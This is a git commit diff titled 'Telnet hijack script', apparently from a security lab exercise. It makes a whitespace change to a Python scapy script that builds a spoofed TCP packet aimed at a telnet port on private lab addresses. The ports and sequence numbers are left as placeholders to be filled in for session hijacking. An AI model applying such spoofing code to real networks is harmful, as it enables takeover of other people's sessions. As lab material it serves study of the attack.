d18fdd44aa37dfb3c26d1a821bedc9cf82d2c8dd
OhMy <154803833+OhMyYao@users.noreply.github.com>
2025-11-16 20:23:59 +1100

    Telnet hijack script

--- Python/hijack.py
+++ Python/hijack.py
@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 from scapy.all import *
 
-
 ip = IP(src="10.9.0.6", dst="10.9.0.7")
 #Change the @@@ to the correct ports, seq and ack numbers to spoof a packet
 tcp = TCP(sport=@@@, dport=23, flags="A", seq=@@@@, ack=@@@@)
